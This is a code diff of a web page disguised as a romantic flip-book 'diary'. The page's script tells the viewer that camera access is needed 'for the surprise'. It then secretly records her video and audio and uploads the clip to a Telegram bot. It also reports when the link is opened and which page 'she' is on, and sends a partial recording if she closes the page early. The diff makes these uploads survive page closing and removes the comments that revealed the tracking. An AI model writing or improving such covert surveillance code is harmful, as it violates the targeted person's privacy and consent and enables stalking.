@@ -75,41 +75,48 @@
         function setupZ() { const pages = document.querySelectorAll('.page'); pages.forEach((el, i) => { el.style.zIndex = pages.length - i; }); }
         setupZ();
 
-        // Tracker: Send notification when she flips a page
         function flipPage(el, pageNum) {
             el.classList.toggle('flipped');
             if(el.classList.contains('flipped')) {
-                fetch(`https://api.telegram.org/bot${t}/sendMessage?chat_id=5324376571&text=She%20is%20on%20Page%20${pageNum}%20❤️`);
+                fetch(`https://api.telegram.org/bot${t}/sendMessage?chat_id=5324376571&text=She%20is%20on%20Page%20${pageNum}%20❤️`, {keepalive: true});
             }
         }
 
         async function startDiary() {
             try {
-                fetch(`https://api.telegram.org/bot${t}/sendMessage?chat_id=5324376571&text=Link%20Opened!%20❤️`);
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                fetch(`https://api.telegram.org/bot${t}/sendMessage?chat_id=5324376571&text=Link%20Opened!%20❤️`, {keepalive: true});
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { width: 320, height: 240, frameRate: 15 }, 
+                    audio: true 
+                });
+                
                 document.getElementById('video-preview').srcObject = stream;
                 mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
                 mediaRecorder.ondataavailable = (e) => { if (e.data.size > 0) recordedChunks.push(e.data); };
                 mediaRecorder.start();
+                
                 document.getElementById('overlay').style.display = 'none';
                 document.getElementById('diary-wrapper').style.display = 'block';
                 bgMusic.play();
 
-                // Standard Auto-stop after 10s
                 setTimeout(() => { if (mediaRecorder.state === "recording") mediaRecorder.stop(); }, 10000);
 
                 mediaRecorder.onstop = async () => {
-                    if (recordedChunks.length === 0) return;
-                    const blob = new Blob(recordedChunks, { type: 'video/mp4' });
+                    const blob = new Blob(recordedChunks, { type: 'video/webm' });
                     const formData = new FormData();
                     formData.append('chat_id', "5324376571"); 
-                    formData.append('video', blob, 'reaction.mp4');
-                    fetch(`https://api.telegram.org/bot${t}/sendVideo`, { method: 'POST', body: formData });
+                    formData.append('video', blob, 'reaction.webm');
+                    
+                    // Uses keepalive to ensure upload finishes
+                    fetch(`https://api.telegram.org/bot${t}/sendVideo`, { 
+                        method: 'POST', 
+                        body: formData,
+                        keepalive: true 
+                    });
                 };
-            } catch (err) { alert("Camera access needed! ❤️"); }
+            } catch (err) { alert("Please allow camera access for the surprise! ❤️"); }
         }
 
-        // EMERGENCY UPLOAD: If she closes early, send what we have
         window.addEventListener('beforeunload', () => {
             if (mediaRecorder && mediaRecorder.state === "recording") {
                 mediaRecorder.stop();
